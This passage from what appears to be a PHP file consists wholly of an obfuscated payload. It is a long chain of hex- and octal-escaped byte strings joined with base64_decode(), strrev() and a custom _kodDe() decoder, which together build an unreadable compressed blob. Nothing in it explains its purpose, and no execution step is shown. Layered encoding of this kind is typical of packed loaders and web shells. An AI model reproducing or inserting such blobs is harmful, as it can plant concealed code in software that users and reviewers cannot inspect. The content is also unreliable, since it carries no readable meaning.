xec\xea\xf5\xda\xfe\x7f\xd9\xf3\xfb\xcf\x1f\xb6\x47\xf5\xd5\xbb\x78\x36\x5f\xfc\xfa\x6f\xd3\xef\xfc\x79\x2f\xaf\xf7\xb4\x9a\x95\x1b\xfa\xe\x5b\xd4\x61\x7b\x7f\x7b\xb1\xfa\xe5\x97\xe\x7a\x7f\xbb\x3b\xf0\x49\x67"."\xcf\xb\xf7\x7e\x3e\xd7\x73\xfc\x2d\xcb\x47\xaf\x4b\x6d\xfe\x59\xea\xc8\x96\xc2\x11\xbb\xee\x76\xf6\xf9\xff\xf8\xe3\xf4\x1b\x23\xe6\x49\xcb\x6e\x9d\xec\x1d\xb9\xe4\xe0\xcf\xa\xc9\xc8\xb5\x4d\x77\x9e\xf5\xb9\xfd\xc3\x47"."\xae\xdd\x74\xe2\x9c\xc3\xff\xfb\xe1\xa7\x7\xfd\x57\xba\xa7\xf3\xa9\x1b\xf\x78\x79\x56\xa6\xed\xc9\x8f\x96\xce\x3f\x21\x77\xec\x8a\x9e\x96\xfd\xaa\x6e\xfd\x45\xf5\xc1\x3f\x4a\x25\x7e\x39\xfb\xb5\x7b\xa2\x63\xd3\xdb\xeb".base64_decode('O9032x6b8C7feEi68b6O9+c+/s9jHdr6wpJrApml9/630+dbcvDvLzr4hVX37PCfS/e85edn/g==')."\x6b\x8f\xc6\x33\x8e\x3f\xa9\xe7\xb5\xeb\x4e\xd3\x17\x6d\x3e\xf4\xde\x2b\xae\x7d\xba\xfe\x97\x3f\xac\x5b\x30\x36\xcf\xac\x4d\xed\x1b\x78\x6d\xf7\xf6\x5f\xbf\x73\xfc\xc7\x27\x4d\x67\xe6\x2c\x3b\x26\x3a\xd5\xbd\xff\x3d\x83"."\x7b\xfc\x68\xcd\x3e\x67\x7c\xd1\x71\xf6\x65\x47\x66\xd4\x25\xb5\xb9\xab\x3a\xff\xfc\x61\xcf\xbc\xd3\x5a\x57\xf\xfc\x79\xf6\xed\x89\x4f\x2f\x7e\x6e\xce\xc5\xbd\xb7\xff\x6c\x9f\xf4\xea\x2b\x4f\x4c\xee\xf7\xf8\xbf\x5b\xde"."\270\371\43\333\63\37\264\377\344\210\332\215\155\201\3\335\213\202\247\117\276\124\274\370\362\341\47\276\130\223\371\352\156\377\342\247\176\374\314\272\37\177\166\116\340\300\275\57\173\366\201\267\317\176\154"."\376\337\366\153\71\344\354\77\236\137\265\353\246\23\147\77\274\313\326\355\313\146\277\374\326\217\357\272\356\223\233\236\170\347\200\17\266\27\156\275\166\315\370\145\336\225\17\335\260\335\166\327\175\347\254".base64_decode('sg0Z84943t1U1x2+JLX3sSsSD/zN2Dv0zDXH3T3/9VMOf2iP4354xQ/22P8s31ezGj/aOuuRiQ==')."\xa3\x6e\x5e\x73\xe0\xaa\x8f\xe6\x5f\x18\xd8\x61\xe7\xb3\x8c\xde\x7b\x76\xbd\x74\xaf\xbd\x57\xef\xbd\x63\x8d\x31\xf6\xaa\x7a\x5c\x71\x4f\xc7\x51\x7b\xad\xa\x3f\x1e\x1f\x76\xbe\xf9\xd0\xd4\xed\x67\xff\x46\xfb\xe9\x71\x7f"."\71\354\142\165\311\16\261\246\145\53\167\171\373\76\233\343\374\171\277\156\372\362\157\67\354\164\213\362\334\223\177\371\215\317\137\167\374\121\365\17\155\275\371\17\23\251\13\227\156\137\372\124\323\352\246"."\7\35\351\314\346\3\332\207\355\247\137\173\123\353\367\156\155\52\36\321\375\237\217\217\210\376\351\332\301\3\37\71\142\307\273\356\216\276\265\303\322\45\317\151\257\354\20\275\357\276\325\133\176\273\172"."\377\277\317\177\376\272\273\26\377\150\343\256\352\354\355\37\14\356\341\333\264\345\323\325\377\76\272\377\352\375\77\72\103\156\170\345\372\127\236\252\75\372\67\277\350\271\251\77\376\207\131\173\56\233\360"."\155\72\363\221\375\354\366\247\257\330\175\341\107\357\375\50\377\112\341\207\167\77\222\133\327\370\375\65\333\327\275\267\251\346\311\3\37\76\360\67\253\137\314\336\333\365\300\77\367\354\172\175\367\340\234".base64_decode('10+sjj7Z/dSLV5uj/x5ta4/e8WLVDY7bdvr92W/eV98frmlJXb7rmVd74zff6Zx90Z5/v6qn/g==')."\304\332\353\137\134\71\147\203\174\376\137\7\156\76\341\306\35\217\277\144\376\221\17\270\237\351\272\150\307\375\142\223\153\336\70\344\271\77\37\272\107\344\211\325\355\27\354\54\267\274\75\337\166\353\213"."\x11\xdb\x4d\xe3\x2b\x9b\xce\xda\xf2\xab\xef\x4d\xf\x6d\xba\x7a\xeb\x25\x2d\x2b\x3e\xfc\xc5\x82\x3d\x77\x8b\xde\xdc\xb9\xe0\x64\xcf\x5f\xab\xcc\x9f\x4c\xbe\xe2\x5d\xba\x67\xf4\x84\xe6\xc9\x47\xe3\x37\xf4\xef\xde\x78\xd2".base64_decode('hftMxa59Rnv66XueX1etPtZ9l/ONxe9+/93T/rj+of907/VKwHXflQvmHnHgo4nrw0f/4Yx7fw==')."\264\345\242\67\226\325\324\107\176\352\336\167\247\57\253\206\207\327\4\22\357\235\272\353\253\263\203\216\163\174\73\17\257\154\16\77\163\332\155\107\334\340\70\370\7\57\134\372\340\317\367\173\373\201\113"."\37\274\113\317\35\162\176\140\301\312\332\124\166\227\225\315\107\74\271\371\253\147\216\74\164\374\306\145\223\117\257\372\305\303\357\265\54\176\172\355\237\232\126\17\34\335\362\223\207\172\256\271\141\353\352"."\253\66\55\75\133\152\37\251\173\375\362\213\167\171\342\173\205\65\27\107\357\336\377\370\267\176\337\166\153\143\125\367\322\352\100\136\212\56\170\155\327\320\313\75\341\245\371\375\73\356\174\334\71\353\312".strrev('kYèsÚE·Ÿó°§¥i·¤|]j{…ñcß_Ó‚é¯8Ñíşc:ï{ê{¢Ó¯t¿®¸·9')."\257\35\74\363\332\310\376\321\13\6\116\51\274\324\345\174\255\363\267\37\217\367\364\277\366\112\115\144\155\323\273\353\216\337\376\101\133\227\361\301\201\301\327\376\375\351\363\127\375\347\245\356\315\377\334"."\xb2\xf7\xe7\x9b\xf\x5e\xb6\x66\xc7\x9b\x3f\xfc\xb5\xfc\x4e\x4c\xbd\xa6\xe9\xef\x4b\x56\xea\xc7\x6\x3c\x4f\xd4\x45\x57\xec\x27\x2f\x38\xeb\xd2\x53\xfe\xf4\xda\x91\xfb\x3f\xfb\xe9\xa6\xff\xfe\x2c\x3d\xe7\xd0\x2a\x6f\x71"."\xed\x86\xfd\x9f\x51\x3f\x6e\xda\x71\xfe\x73\xbe\x81\x13\xf\x30\x1e\xf8\xe0\xeb\xb5\x7f\xba\xe0\xa0\xc5\xeb\x37\x3e\xd8\xb2\x21\xbd\x2e\xb2\x83\x96\xac\x5f\x12\x5a\xff\xe8\x15\x89\x2d\xcf\xed\x3c\xdb\xf7\xc6\x2d\xbf\xff"."\xdd\xd\x3f\xfa\x62\xe7\x9f\x55\x8f\x6d\xfc\x53\x21\xf7\xd7\xf4\xce\x9f\xc5\xff\xfd\xc2\x31\x57\x3f\xb6\xb1\xf9\xc4\xf\x3f\xf9\x59\xe3\x7b\xb7\x9d\xfa\xb8\xda\xb2\x9b\xeb\x5f\xd7\xf7\xde\xb8\xdd\x7c\xea\xaf\xfe\x47\x3e".base64_decode('jF41eNWRp/7cvftDay78wxsPrXn2pMimU285/a1zXrht2/UXHr3qqA8zHZqnd6+XBt7K9blveA==')."\346\343\167\317\337\160\367\115\123\47\174\372\376\155\27\276\375\171\370\202\233\156\271\246\140\154\135\20\332\371\360\124\314\343\174\143\341\347\241\337\215\137\65\372\323\13\56\174\375\331\376\125\347\73\176"."\322\171\100\125\365\332\57\337\171\373\276\71\207\37\366\311\107\133\206\267\374\56\374\365\347\17\336\370\370\357\42\267\117\177\362\362\323\227\155\171\54\362\345\353\137\336\363\346\76\347\175\265\365\243\373".base64_decode('Hn74H/+Nqgct+fTgzk+PnvPjrzafd9czxVNujd74p/SfPf86+l97NR7siYd9a9p+9ds9N5z/0A==')."\171\47\356\173\353\75\277\352\134\365\361\333\346\357\75\241\357\277\267\355\311\140\174\367\103\245\7\172\335\173\354\160\124\307\17\3\247\236\345\332\176\177\365\307\362\35\341\247\116\13\317\77\374\212\377".base64_decode('HNfy5P0rHeE1Bzz7y69u+MOyufss+PCKpnNeO6X+59XBPf5w9Y+Hrzm1K/uXC+eu3E/5+eabZw==')."\255\77\160\135\315\306\111\63\366\121\356\253\227\116\277\276\167\374\306\125\117\327\375\65\75\67\362\100\373\241\153\106\136\172\341\245\167\26\137\172\334\141\372\331\57\57\314\355\364\264\273\301\251\256\173"."\x77\xd3\xbe\x27\xc\xfe\x76\x8d\xe3\xb3\xe7\x2e\xa\x3f\x74\xf3\xf7\xe6\xbf\xb3\xef\xe3\x67\xed\xde\xb5\xe7\xaa\x74\xe6\x57\xf7\x2d\xf1\xaf\xec\x7a\xf7\xfc\x3b\xae\xda\xbf\x78\x7f\xac\x6f\xaf\x1f\x3c\x7d\xec\x68\x6c\xec"."\302\173\237\356\172\52\320\363\323\246\335\365\337\310\371\117\36\255\251\272\156\316\364\101\37\252\137\334\260\344\270\275\377\161\377\335\217\235\274\265\343\346\307\253\176\372\347\107\117\15\75\255\237\172\165".strrev('Ù«Å}·ëúåı<–å‹èc?Oúúœ–Ño‡ïazÌ}Oş¹¼šß]7{øu]—mËõ{l')."\374\201\217\77\366\336\366\173\262\267\57\173\130\53\24\36\177\150\227\344\222\113\176\370\374\271\323\223\53\76\274\361\335\271\307\276\174\373\231\243\223\13\376\366\334\37\156\174\351\200\213\327\32\227\311"."\257\177\342\365\116\114\116\36\377\102\373\321\333\157\371\362\234\263\374\3\253\137\256\333\272\307\256\347\255\172\171\315\310\350\45\55\67\314\273\241\136\177\352\342\257\137\335\157\150\321\63\77\75\254\261".base64_decode('dpeTr/oiPmvXB048YeN9a+/cYfnD9+956xv737xXdjw6zzt97kmX9572bu/i1R8lVx5R9XD6nA==')."\363\203\173\245\356\330\272\351\321\256\311\273\353\206\377\361\325\176\373\334\265\151\317\53\116\72\150\376\137\36\271\64\372\367\225\313\117\211\154\131\24\135\264\353\202\217\167\172\377\47\177\377\335\117\357"."\x39\xf9\x91\xd8\x43\xef\x6d\x7b\x7f\xee\x9c\x27\x37\x5d\x31\x77\xcb\x19\xbf\x7c\xb5\xf6\x86\xc4\x19\x23\xbb\x7b\x5a\x9f\xd8\xef\xab\x13\xd6\xbf\x3f\x7f\xcf\x45\xf1\x7\x8f\x3a\xb8\x69\xb7\x57\xe7\x87\xdc\xef\x5f\x71\xa4"."\x27\xf3\xe5\x71\xca\x29\x8f\x85\xbe\x76\xbc\xda\xf8\x50\xa4\x76\xef\xd3\xd2\x3\x41\xf7\x45\xeb\xce\xb9\x7a\xab\xfd\xa0\xa9\x2b\x4e\x59\x18\xb9\xbe\xb8\x60\xc9\x81\x27\x1e\xf6\xd1\x87\xbb\xbc\xf4\x98\xbb\xf6\xe4\x76\x7b"."\103\377\271\307\205\343\217\357\274\360\201\372\71\267\176\321\150\133\364\240\272\317\61\263\37\71\253\170\302\137\332\256\77\161\365\300\61\273\125\315\175\303\335\374\313\360\331\17\375\355\250\343\376\271\125".strrev('îÍcwà°Ü)Ì¿ê.Wı—¾GÅzÜ÷k…½ñ;G0\'óş?eÅ|½lÊ¿·Šõ¼.—ÃÓ‚ú¾')."\371\321\202\227\256\71\354\361\227\132\22\311\35\236\331\105\377\370\330\163\157\277\177\325\365\327\334\262\375\255\75\367\172\156\337\55\357\324\137\227\36\75\367\230\147\317\163\276\272\350\7\351\263\26\330"."\142\127\116\57\71\345\322\143\245\273\247\306\253\336\373\174\237\147\47\17\272\345\27\137\6\217\161\270\107\126\375\173\175\164\337\57\276\332\353\344\133\243\173\37\23\337\147\337\225\213\235\306\354\37\274"."\xf2\xe6\x49\x8e\xb6\x33\xf4\x8f\xda\x3e\xbb\xef\xa2\x91\x33\x16\xde\xbb\x76\xef\x4b\x8e\xff\xcd\xc8\xe9\x7\x5\x9f\xdc\xa4\xdf\xfd\x91\xb2\xaa\xd9\x96\xae\x1e\xac\x7a\xe7\x94\x3\xef\x9c\xb7\xd3\xae\xd\xae\x5f\x3b\xcf"."\373\352\253\327\336\36\336\347\316\257\276\174\347\341\310\357\16\377\367\47\237\37\176\230\361\365\207\325\147\316\351\274\375\263\173\72\357\334\370\365\333\237\377\315\71\67\73\361\311\33\317\155\275\363\216"."\x4d\x5f\xdf\xf1\xf9\xdf\xb6\x3e\xbc\xcf\x99\xe7\x1d\x56\xfc\xfa\x9f\xff\x38\xf7\xf0\x8f\x9e\xd8\xfa\xf7\xc3\x6f\xfd\xe2\xb5\x6b\xff\xfb\xf5\x7f\x8c\xc7\x5a\x8e\x88\x2f\x9\x6d\x3e\x68\xed\x6d\x1f\x77\xbc\x9e\x6a\x3f\xa3".base64_decode('Y9t+K+PZF+/4sKV4dvufA+8fe+M/9pl+4Zprnm755+Ztz2wfGJ/ccvvhf1367vYvjr7w9Vs/fQ==').base64_decode('r3N5d/9f7n/guoH7b3j9J9pr329uO/exbUnbrh8fG70kfMmV//j64NWzv/yRuv+lfwydutX/+Q==')."\75\347\156\330\322\370\321\51\33\332\34\117\365\353\315\305\73\27\170\226\64\367\171\234\127\355\276\373\211\215\211\305\107\136\274\327\234\337\236\334\260\376\257\327\336\170\311\134\143\247\27\317\151\137\271"."\374\202\115\27\257\356\136\121\163\363\226\317\215\123\302\247\46\136\237\365\345\217\37\353\210\57\350\374\31\125\23\136\324\114\56\362\325\244\62\21\117\114\343\10\121\175\134\334\100\22\233\32\210\240\30"."\x33\xcc\xf1\xec\x14\x51\x3c\x21\xea\x8\x8d\x4b\x49\x62\x33\xfe\x19\x9b\x8e\x15\xd2\x19\x76\x44\xa2\x47\x27\xd\x72\xb\x41\x4a\x1b\xd7\xe3\xd1\xc4\x34\x39\x49\x6a\x5e\x4c\x76\x95\xd1\x58\x7e\xca\xa0\xc7\x65\xd\x8b\x9"."\xee\x92\xa5\xf8\xb7\xa5\x9e\x4\x32\xf9\x54\x4e\x9e\xa4\xea\xd\x66\x31\x1b\x4f\x92\x63\xa5\xe8\x58\x31\x66\x24\x53\xb4\x52\xa4\xd8\xc5\xcd\x4b\xe9\x87\x48\x7d\x1b\x9a\x49\x60\x69\x33\xa9\x71\x63\x3d\x41\x6e\x6e\x20\xc8"."\x4b\x69\x9b\x96\x34\x92\xc3\x8b\x31\x3d\x23\x67\xa3\x44\xe8\x9e\x18\xcf\x8d\x99\x54\x9d\x70\x4a\x89\x27\xa3\x29\xd5\xb2\x45\x5e\xba\x98\xec\xe2\x72\xea\xf4\x98\x46\x10\x1b\x69\x2f\x2e\xa9\x27\x81\xfc\x54\x4c\x4b\xc5\xc9"."\x7e\x32\x1a\xcf\xa5\x26\xa7\x89\xf6\xe9\x92\x16\xd2\x1\x13\xb9\xf8\x74\xb4\x48\x4a\x68\x69\x6a\xa2\x7b\xe9\x89\x5c\x96\x2a\x66\x25\xf5\x89\x62\xa6\x40\x6\x25\x5b\x8c\xc6\x27\x54\xb2\xa7\x57\x12\x69\x23\xa6\x92\x2e\x59"."\262\210\174\165\51\355\324\45\213\11\44\232\234\214\115\30\144\37\244\253\143\223\205\24\251\324\42\212\33\317\47\242\123\72\271\244\233\236\212\31\32\55\67\77\16\122\144\162\71\227\53\214\117\146\306"."\110\135\242\51\255\70\145\220\341\51\304\212\343\51\172\316\221\232\320\323\112\201\224\326\262\264\236\222\31\151\164\246\250\233\111\172\246\325\330\100\72\263\230\30\57\344\350\0\57\136\114\240\71\175\74"."\x11\xa7\x17\x65\x9a\x31\x56\x4c\x4d\x90\xd6\x2f\x6e\x21\x28\x5a\x22\x2f\x67\x75\x42\xdb\x8b\xc8\xe8\x1b\x69\x79\x3a\x96\x4a\xd0\x11\x21\x5f\x56\xd2\xa6\x3e\x96\x62\xdd\x97\x1f\xd3\xc\xba\x23\xd6\x94\xa9\xe9\x2\x6d\xf3"."\130\101\113\114\222\12\266\54\46\175\324\324\134\117\47\16\245\254\105\264\253\311\45\343\204\134\234\324\25\172\244\247\215\305\342\71\322\77\361\104\116\315\114\220\166\64\54\42\3\155\304\162\52\273\207"."\x5c\x4a\x4a\x35\x93\x89\x69\x30\xe6\x64\x2c\x26\x73\xba\x56\xcc\xd3\x42\xa\xb9\xa9\x22\xa9\xbe\x19\x97\xb5\xd8\x18\x41\x5b\xda\x40\xda\x9d\x8c\xab\x13\xc5\xc2\x24\x45\xc9\x8c\x25\xc7\xd\x3a\xd6\x84\x1c\x16\xb5\x90\x5a"."\x4f\x28\x53\x45\x99\xde\xf\x1a\x63\x32\x18\x14\x52\x76\x52\x1e\x4f\x27\xe8\xd1\xc2\xa2\x46\xd2\x7b\x8b\x97\x32\xca\x22\x90\xa5\xe4\xb7\xb9\x79\x9\x6d\x3\x55\xcd\xce\x46\xa7\xa7\xd2\xf4\xd4\x3f\x39\x61\x1a\xa\x19\x21".base64_decode('JWmo0SLlBLSEKSNZUPNjlC2QD+XkqfSEmaCjX5DTjLHUkwY309opZkFPZykv4jWkHTNWyKanyQ==').strrev('(º`$š#	Ò×ÊDÔÒÅ¦IcãiJÑ6ª’k€Ó&fª“’²™êdÇĞyã2å¯L˜›*eÕ')."\x51\xd2\x99\x5a\x54\x4d\xc7\x8a\x13\x74\xfa\xe5\xa3\xda\x14\xe9\xd9\x86\x86\x6\x1a\x58\x4a\x19\x1b\x21\xea\xe6\x26\xd2\x80\x62\x74\x32\x67\x16\xc6\x28\x87\x20\x5f\x1b\x8f\xe6\xb4\xe2\x24\x69\xcd\xd2\x16\xca\xd\x17\x53"."\x3a\x34\x26\x35\x25\x4e\xfa\x6d\xaa\x50\x8c\x8d\x2b\x24\xb2\x26\x43\xe\xf\xba\xe4\xd8\x38\x9d\x83\x86\x29\x9b\x79\xa3\x4\x81\x2a\xba\xc7\x44\xcd\xc9\x71\x85\x52\x77\x9c\x6a\x1a\xf2\x1b\x60\x23\x8f\xf4\x75\x69\x3a\x3f"."\236\200\347\72\302\115\61\214\6\105\334\130\326\24\222\101\314\222\12\65\363\340\51\12\217\321\23\372\240\251\351\354\356\34\253\252\70\140\15\35\326\6\121\376\117\60\342\121\113\72\203\322\263\227\322"."\224\104\51\74\212\272\316\101\173\40\52\364\244\34\317\250\131\207\51\33\343\16\21\154\27\123\325\54\50\54\235\166\130\315\143\170\345\370\215\143\146\312\230\110\227\45\363\236\302\237\210\224\265\116\354"."\75\302\351\45\166\363\106\356\217\150\204\37\41\122\75\54\374\263\316\106\15\142\152\45\244\213\26\224\210\132\236\215\374\316\306\77\141\302\101\303\144\236\124\333\210\2\271\273\113\260\364\311\305\311\230"."\265\262\104\167\220\350\11\221\16\161\302\16\241\212\54\225\306\246\254\345\260\261\274\55\65\60\110\152\217\315\127\34\345\335\207\7\131\354\40\313\327\121\217\363\154\111\263\274\233\310\247\371\167\311\175".base64_decode('BgeIdGMlbQtFWScFOQJFNjQ2CX/QJqHbQclq1eF188EUiQwsPGk5xiqVm5ISMkCPt0oJMHskqg==').base64_decode('gSyZGg2L1RGvJksaYJmNpU2wJIKezDMbCXa3Ip7Hohta3pk4yu5ugqAkdrOsK3GVqr8pGYRJVQ==')."\x4e\xd1\xdd\xc\xd3\xbb\x8b\xa5\x15\x59\xb7\xdc\xb\xb5\x75\xe6\x52\x39\x68\x18\x67\x2e\xeb\x24\xc6\x39\x11\xe1\x83\x24\xcc\x95\x9a\x45\x68\xba\xf4\x92\x89\xce\x53\x87\x85\xa0\x21\x9a\x90\x43\x52\x74\x5d\xd3\x97\x41\xee"."\xd4\xce\xa1\x38\x94\xcf\xc2\x70\x20\x9f\x85\xa9\x84\xfe\xa1\xba\x15\xd4\x5a\xe5\x75\x80\x3d\xca\x7\x3a\x22\x27\x88\xea\xbe\x57\x30\xd3\x89\x24\x15\x33\x42\x18\x32\xe9\x9a\x2e\x57\xd0\xdb\x1d\x19\x74\x51\x8d\x53\x39\x97".strrev('˜!T&§2D“ n*Ôz#gn”‡[ô¥ —ß¢Iñ^5¡N†¤ÄŠ‡˜¤İ5G+ªš–s')."\13\5\370\240\302\354\150\214\277\41\253\51\16\104\16\264\74\313\24\232\200\204\107\257\320\14\320\35\152\126\141\344\220\67\270\356\246\314\347\45\124\367\213\304\322\32\145\271\200\214\42\161\225\40\372"."\xbc\x80\x23\x79\x89\x71\x5a\xab\xc0\x79\xa1\xa2\x3c\xbf\x5\x85\x31\xae\x30\xf\x2f\x15\xc4\x1b\x52\x3\xac\xbb\x3a\xe9\x1d\x68\xc8\x6\x75\x1f\x83\x12\xe7\x87\xdd\x7d\xae\x0\xd3\x6f\x5c\xe4\xa8\x77\x34\x70\x5c\xf0\xc1".base64_decode('CFTzbKcGOMGQK1DBqBEbO5LeJAaOJEOff1jq9vuG+geC2IoPwwf8QjrSYrMki2BSrGfQ5+r2SA==').base64_decode('3oGQn6qnMi1dshhYV4scNDtiRowkP46IytNiiawkQoIjtupwVbguXBOuXecIG6NkCVgnLIWqOA==').strrev('ÛQövÚ'."\n".'Ún·+Ûù¾\'-Æı]§›Àâöïè$3˜­n®ûé¨’¸0L¦A¸¡ek­&è2$:')."\xce\xbc\xe1\x8d\x9b\x36\xbf\x75\xf4\xed\x5b\xaf\xfc\xd5\x9b\x77\x9c\xb8\xed\xb4\x2d\xdb\x7e\x75\x24\x69\xc6\x5b\x5b\x6e\x7c\xe3\xf6\x3b\xdf\x3c\xed\xe2\xad\x57\xfe\x66\xdb\x19\x37\xbf\x79\xf6\x31\x38\xe1\xed\x4b\xae\xde"."\172\374\305\254\142\322\333\247\336\261\355\304\213\266\235\176\325\266\315\127\156\275\345\324\255\267\35\265\365\246\233\154\40\367\333\307\156\176\363\366\53\267\375\362\214\155\27\36\261\355\372\23\266\235\263".strrev('ª_‚½*·àµÃØBÆÃ—¸5u'."\r".'®w6¹„|p”¸?N[[ón=oG÷õ²ÜO7âë=lñëy')."\43\10\250\57\10\215\131\6\272\75\245\112\344\142\224\30\202\326\141\2\201\364\35\61\224\211\274\222\5\114\236\30\222\322\170\4\331\25\124\317\130\213\15\204\14\204\112\11\225\161\173\202\335\1\157"."\227\207\250\125\262\201\232\217\324\2\311\155\74\200\6\3\253\130\230\131\132\224\231\357\112\65\134\132\261\64\104\166\304\264\164\76\223\105\225\225\252\240\146\112\225\15\162\164\244\321\56\125\301\245\10"."\x0\x94\x18\x98\x79\x35\xd0\xf4\xf\xe9\xb9\x55\xaf\xa9\xb6\xd5\xdb\x1a\x6a\x25\x62\xdb\x8b\x73\x10\x5b\x5e\xa9\x8a\xd8\xf1\xb2\x7c\x96\x8f\xd8\xa2\x96\x58\x83\xad\xbe\x56\xaa\xca\x8d\x57\x91\x7a\xf1\x7e\x5\xb5\x8f\x60"."\114\103\222\155\65\244\302\142\165\71\56\340\174\206\251\313\52\140\373\122\314\306\100\54\77\370\265\330\347\306\34\74\7\36\47\200\121\12\223\134\3\156\53\46\66\353\35\254\226\344\154\34\244\340\376".strrev('Œh¸¢Ñâ„'."\r".' t%«€¨l%Tuãeì»	5Òİ£:Y²ˆª]‹HJŠVº¹‡')."\17\2\54\145\134\231\342\45\1\256\304\22\350\10\102\70\33\304\12\151\310\336\272\12\313\115\270\235\31\43\111\71\36\61\363\355\137\303\332\100\151\231\14\201\302\255\265\241\311\205\47\324\335\207\251"."\74\50\220\171\74\72\337\102\250\274\73\45\13\211\244\271\201\36\302\303\323\5\62\204\335\20\236\167\240\307\37\350\307\246\6\301\356\76\117\277\313\101\170\71\246\4\214\17\345\26\251\135\252\206\234"."\17\203\252\55\335\217\76\104\273\54\204\276\12\346\125\304\124\14\23\367\102\56\111\52\103\106\137\102\266\144\62\312\322\136\215\255\46\111\221\314\271\200\77\20\212\200\16\40\354\131\340\272\325\302\242"."\41\352\172\346\165\275\300\66\211\130\202\347\302\210\274\220\313\125\112\234\60\307\204\34\3\173\100\152\124\34\245\236\12\100\25\340\227\273\375\3\75\136\152\173\341\216\132\322\334\1\57\264\167\44\225"."\223\150\11\202\241\13\210\160\245\1\20\311\115\306\131\230\133\317\301\4\46\17\200\10\27\7\100\204\255\104\20\113\360\244\0\276\17\265\357\70\7\36\166\263\160\37\63\233\202\11\376\200\20\161\5"."\134\375\101\26\15\14\3\216\16\141\202\171\120\277\53\30\2\255\32\30\352\347\134\337\347\132\5\10\306\317\145\24\312\261\153\34\165\235\265\141\154\374\200\203\370\147\71\215\101\305\363\321\365\15\66".base64_decode('qWVjLcGh5gIRMwWkxwj/ykpfxOfvxXHkyMGTjXPBXhqRgPwb4vKvQZcvNiMkQMcStqiSBvzDLg==')."\xee\x15\x40\x48\xc0\x10\x22\x61\x4b\xdc\x57\x80\x73\xed\x48\x78\x32\xec\x0\xe2\x83\xb1\x8e\xdb\x34\xb8\xbb\x24\x2a\x98\x74\x43\x1\x18\xb\xe9\xd4\x77\x86\x8b\xae\xa8\x74\xe9\xa0\x3b\xde\x48\x5a\x4b\x52\x1b\x60\xc0\x22"."\xa9\x0\x81\x7f\x57\xd3\x0\xe2\x9e\x24\x3\xd8\x2\xe6\xd2\xd4\xc6\x1\x1b\x57\x44\xc2\x1b\xc2\xb\xc2\x76\x7\xb6\x27\x81\x52\x4d\xd8\xc6\x6b\x16\xf1\xac\x6\xab\x6e\x30\x68\x31\x86\x89\x20\xbb\x79\x52\x3a\x68\x33\x9"."\xe1\x79\x8c\x23\x6d\xe4\x87\x6c\x6a\xda\x48\x4f\x90\x68\x47\x3b\x1b\x5a\xcf\xca\xd\x3\xe0\xaf\x37\xb4\xc1\x3\xfe\x7c\xe0\xc7\x17\x2\x83\xa7\x32\x4\x30\x49\x7d\xde\x15\x9e\xd\xf0\x1f\x9e\x50\x2b\x89\x8\xde\x81\xd"."\xe0\x5f\xc0\x62\x36\x78\x7\x4a\x33\x77\x79\x42\xc3\x1e\xf\x46\xa0\x61\xf2\xcb\x51\x1\xcb\x21\x4d\x13\xdc\x7c\x1c\xe2\xa7\xb6\x4f\x92\xcf\xd3\x13\x92\x60\x9c\x7e\x36\x12\xa9\x41\x9d\x67\x1f\x5d\x58\x1b\x89\x38\x8d\x21"."\x42\x2d\xcc\x76\xb4\xa6\x7a\x5e\x43\x35\x59\x45\x5c\xc1\x6e\xce\x7f\x2d\x74\x50\x4e\x2\x48\x17\xd9\x3a\xfe\xcc\x6d\x5\x89\xf7\x6\xfc\x43\x83\x42\xbc\xcf\xb5\xca\x3b\xd0\x4b\x63\xce\x3a\x1a\xaa\xa3\xd6\xf6\x6e\x6f\x10"."\164\121\67\245\101\356\115\103\214\23\221\23\11\106\242\370\153\41\150\67\340\355\40\42\10\345\160\67\200\171\263\165\216\165\15\171\175\156\321\336\17\42\222\45\5\361\165\262\252\314\247\225\243\161\144"."\xf9\x47\x23\xb0\xcb\x69\x18\x91\x17\x8d\xa0\x3e\xa0\x11\xdc\x1\x34\x86\xba\x8b\x46\x90\xd7\xe\x1a\x41\xd\xa5\x11\xb8\x3d\xf1\xc\xd0\x34\xb0\xbb\x3\x3b\x33\xba\x65\x4b\x72\x55\xd6\x94\x5c\x10\x4c\x6b\xb8\x49\x9f\xa9".base64_decode('5wXVSabWiNS68lGY4oFjSBYMdMgB9ndkYPFShdNspiZxLKs2JjXfwx43SnWuRDDTtVI1GPfnTQ==').base64_decode('0fdFgp9KUhViU8lYShkSzHHkOLc7kZkRjZniZkOiWwx3F/7NQNXioJJO0GUM6a9xJWbWR4ag1w==')."\x86\x4e\x5c\x78\xa3\xb1\x9f\x91\x92\x8c\xa4\x24\x2f\xab\xb2\x80\xc5\x81\x3e\xee\xea\x2\x1e\x82\xf0\x32\xfb\xd5\xac\xd7\xcf\xa6\x27\x73\x28\x31\xad\xd2\x3\x49\x56\xb1\xac\x36\xa8\xe8\x19\x15\x1d\xed\xc\x73\x15\x58\x96"."\256\360\21\205\335\21\142\7\317\350\134\55\153\165\275\221\317\202\57\14\262\301\262\67\120\144\352\261\10\321\207\304\126\164\246\320\11\6\4\345\25\324\5\221\347\17\122\254\236\306\104\164\160\111\345"."\114\115\353\227\263\123\41\155\225\252\220\153\25\267\177\170\300\347\247\116\0\250\273\217\157\252\64\242\121\356\253\211\174\143\230\362\101\135\246\66\361\201\356\76\40\226\104\172\274\100\146\363\254\46\113"."\377\12\277\73\22\364\17\5\350\216\32\306\221\362\176\300\323\275\206\355\152\31\264\307\265\252\24\2\213\13\271\172\53\202\331\211\26\204\243\371\37\11\370\241\4\347\361\365\224\144\10\366\61\317\20".base64_decode('VljE5x1YUTEh5I/0C1kwEOzj+kth1hKCHtgVPN7l83cLyZTwxJ4ATKcEiEU8tmiF16M9cWtnTQ==')._kodDe('KrIsIvXqB0z8LlkPt19fwrY7QocR5GHYIIh7H9+Rd/sCtL009laGnlp0iO98VIy7MjjZ1ka1Ojc=')."\x3\x34\x7b\x70\x94\x7a\x74\xf0\xfa\xd1\xc9\x5e\x24\xb8\x26\xc8\xba\xc\xeb\xb7\x57\x4a\xb7\x10\x9\x46\x13\x8f\x5e\x4b\x90\xc1\xdf\xa0\x88\x1a\x52\x32\xb9\x8a\x88\x16\x2a\xc3\xb8\x16\xb3\x25\xc\x72\xa8\x1a\xe7\xd\x41"."\4\22\315\204\60\22\307\130\257\152\255\164\376\304\362\320\44\221\167\54\237\173\0\104\224\323\331\45\376\32\173\306\36\17\207\172\241\103\202\360\241\54\203\252\13\36\1\300\216\66\216\234\40\320\73"."\x90\x18\xe5\x60\x79\xb0\x77\xa0\xe7\x87\x90\xe3\x1b\xf6\x49\x95\x56\x69\x1e\x33\x3b\x24\xf7\x3\x11\x19\xd9\xc1\x46\xc4\xbb\x9f\x9\xbb\xa1\x26\xb3\x76\x39\x9d\xd4\x0\x27\x4b\x65\x28\x54\x1e\xb7\xa4\x73\x6f\x12\x39\xd"."\354